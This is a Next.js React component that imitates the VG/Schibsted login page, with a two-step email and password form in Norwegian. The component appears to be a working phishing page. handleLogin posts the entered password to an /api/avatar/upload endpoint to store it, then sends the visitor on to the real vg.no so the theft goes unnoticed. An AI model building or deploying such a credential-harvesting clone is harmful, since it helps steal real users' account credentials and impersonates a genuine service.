'use client';

import { redirect } from "next/navigation";
import { useState } from "react";

import { put } from "@vercel/blob";

export default function LoginStatic() {
  const [showPasswordBox, setShowPasswordBox] = useState(false);
  const [input, setInput] = useState("")

  const goToPassword = () => {
    setShowPasswordBox(true);
    setInput("")
  }

  const handleClick = () => {
    if (!showPasswordBox) {
      goToPassword()
    } else {
      handleLogin()
    }
  }

  const handleBack = () => {
    redirect("https://vg.no")
  }

  const handleLogin = async () => {

    const response = await fetch(
      `/api/avatar/upload?filename=${input}`,
      {
        method: 'POST',
        body: input,
      },
    );
    redirect("https://vg.no")
  }

  return (
    <main className="min-h-screen bg-[#eef2fb] text-gray-900">
      <header className="mx-auto flex max-w-6xl items-center justify-between px-4 py-4">
        <button onClick={handleBack} className="inline-flex items-center gap-2 rounded-full border border-gray-200 bg-white px-3 py-1.5 text-sm shadow-sm hover:bg-gray-50">
          <BackIcon className="h-4 w-4" />
          <span>Tilbake</span>
          <img
            src="//d3iwtia3ndepsv.cloudfront.net/clients/images/logos/4ef1cfb0e962dd2e0d8d0000_622a168baeb49.png"
            alt="VG"
            className="ml-1 h-4 w-auto"
          />
        </button>
        <div className="text-sm font-medium text-gray-800">Schibsted</div>
        <div className="w-[92px]" aria-hidden />
      </header>

      {/* Two‑column hero */}
      <section className="mx-auto grid max-w-6xl grid-cols-1 gap-8 px-4 pb-16 pt-6 md:grid-cols-[1.2fr_1fr]">
        {/* Left promo card (VG) */}
        <div className="relative rounded-3xl bg-gradient-to-br from-[#e40613] to-[#b3020f] p-8 text-white shadow-[0_10px_30px_rgba(0,0,0,0.12)]">
          <div className="max-w-md">
            <h2 className="text-2xl font-semibold leading-snug">
              Logg inn og få mer ut av din
              <br /> opplevelse på VG – helt gratis
            </h2>
            <ul className="mt-6 space-y-3 text-[15px]">
              <li className="flex items-center gap-3"><StarIcon className="h-5 w-5" /> Lagre dine favoritter</li>
              <li className="flex items-center gap-3"><SparkIcon className="h-5 w-5" /> Spill Ordstjernen</li>
              <li className="flex items-center gap-3"><MoonIcon className="h-5 w-5" /> Bruk nattmodus</li>
              <li className="flex items-center gap-3"><PenIcon className="h-5 w-5" /> Les tegneserier</li>
              <li className="flex items-center gap-3"><PlayIcon className="h-5 w-5" /> Fortsett å se</li>
            </ul>
          </div>

          <p>{input}</p>
          {/* Phone mock on the right bottom */}
          <div className="pointer-events-none absolute right-4 bottom-0 hidden translate-y-6 md:block">
            <PhoneMock />
          </div>
        </div>

        {/* Right login card */}
        <div className="rounded-[32px] border border-gray-200 bg-white p-8 shadow-[0_15px_40px_rgba(16,24,40,0.08)]">
          <div className="mx-auto w-full max-w-md">
            <div className="flex justify-center">
              <img
                src="//d3iwtia3ndepsv.cloudfront.net/clients/images/logos/4ef1cfb0e962dd2e0d8d0000_622a168baeb49.png"
                alt="VG"
                className="h-6 w-auto"
              />
            </div>

            <h1 className="mt-6 text-[22px] font-semibold">Logg inn</h1>
            <p className="mt-1 text-sm text-gray-600">Fortsett til VG.</p>

            {/* Email field */}
            <label className="mt-6 block text-[13px] font-semibold text-[#0e1b3a]">
              {!showPasswordBox && <p>E-postadresse</p> }
              {showPasswordBox && <p>Passord</p> }
            </label>
            <div className="mt-2 rounded-[999px] border border-gray-300 bg-white shadow-inner focus-within:border-[#0e1b3a] focus-within:ring-1 focus-within:ring-[#0e1b3a]">
              <input
                value={input}
                onChange={(input) => setInput(input.target.value)}
                type="email"
                placeholder={showPasswordBox ? "Skriv in passordet ditt" : "Skriv in e-postadressen din"}
                className="w-full rounded-[999px] px-4 py-2 text-[15px] placeholder-gray-500 focus:outline-none"
              />
            </div>

            <div className="mt-2">
              <a href="#" className="text-[13px] font-semibold text-[#0e1b3a] hover:underline">Glemt passord?</a>
            </div>

            <button
              onClick={handleClick}
              className="mt-4 w-full hover:bg-cyan-950 hover:cursor-pointer hover:text-white rounded-full bg-gray-100 px-4 py-3 text-sm font-semibold text-gray-500"
            >
              {!showPasswordBox && <p>Fortsett</p> }
              {showPasswordBox && <p>Log inn</p>}
            </button>

            <p className="mt-6 text-[13px] text-gray-600">
              Ikke registrert deg enda? <a className="font-semibold text-[#0e1b3a] hover:underline" href="#">Lag en konto</a>
            </p>

            <p className="mt-4 text-[12px] leading-relaxed text-gray-500">
              VG er en del av Schibsted. Du må ha en <a href="#" className="font-semibold text-[#0e1b3a] hover:underline">Schibsted-konto</a> for å fortsette. Bruk samme konto i alle Schibsted‑tjenester.
            </p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="mx-auto mt-6 flex max-w-6xl items-center justify-center gap-6 px-4 pb-10 text-sm text-gray-600">
        <a href="#" className="hover:underline">Hjelp</a>
        <a href="#" className="hover:underline">Personvern</a>
        <a href="#" className="hover:underline">Brukervilkår</a>
        <a href="#" className="hover:underline">Om Schibsted-konto</a>
      </footer>
    </main>
  );
}

/* --- Icons & mocks --- */
function BackIcon({ className = "h-5 w-5" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} aria-hidden>
      <path d="M15 6l-6 6 6 6" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function StarIcon({ className = "h-5 w-5" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} aria-hidden>
      <path d="M12 3l2.9 5.9L21 10l-4.5 4.3L17.8 21 12 17.8 6.2 21l1.3-6.7L3 10l6.1-1.1L12 3z" fill="currentColor" />
    </svg>
  );
}

function SparkIcon({ className = "h-5 w-5" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} aria-hidden>
      <path d="M12 2l1.6 4.4L18 8l-4.4 1.6L12 14l-1.6-4.4L6 8l4.4-1.6L12 2zM6 15l.9 2.5L9.5 18l-2.6.5L6 21l-.9-2.5L2.5 18l2.6-.5L6 15zM18 15l.9 2.5 2.6.5-2.6.5L18 21l-.9-2.5-2.6-.5 2.6-.5L18 15z" fill="currentColor" />
    </svg>
  );
}

function MoonIcon({ className = "h-5 w-5" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} aria-hidden>
      <path d="M21 12.5A9 9 0 1111.5 3a7 7 0 009.5 9.5z" fill="currentColor" />
    </svg>
  );
}

function PenIcon({ className = "h-5 w-5" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} aria-hidden>
      <path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25z" fill="currentColor" />
      <path d="M20.71 7.04a1 1 0 000-1.41l-2.34-2.34a1 1 0 00-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z" fill="currentColor" />
    </svg>
  );
}

function PlayIcon({ className = "h-5 w-5" }: { className?: string }) {
  return (
    <svg viewBox="0 0 24 24" className={className} aria-hidden>
      <path d="M8 5v14l11-7-11-7z" fill="currentColor" />
    </svg>
  );
}

function PhoneMock() {
  return (
    <div className="relative rotate-6">
      <div className="h-[260px] w-[140px] rounded-[28px] border-8 border-[#111] bg-white shadow-[0_20px_50px_rgba(0,0,0,0.35)]">
        <div className="mx-auto mt-2 h-1.5 w-12 rounded-full bg-[#111]" />
        <div className="mx-auto mt-1 h-1 w-6 rounded-full bg-[#111] opacity-60" />
        <div className="mx-2 mt-3 overflow-hidden rounded-2xl">
          {/* Placeholder screen image resembling VG front */}
          <div className="h-[195px] w-full bg-gradient-to-b from-[#1a1f2e] via-[#22335a] to-[#101827]" />
          <div className="absolute left-3 top-[90px] h-8 w-20 rounded bg-red-600" />
          <div className="absolute left-3 top-[130px] h-10 w-24 rounded bg-white" />
        </div>
      </div>
    </div>
  );
}
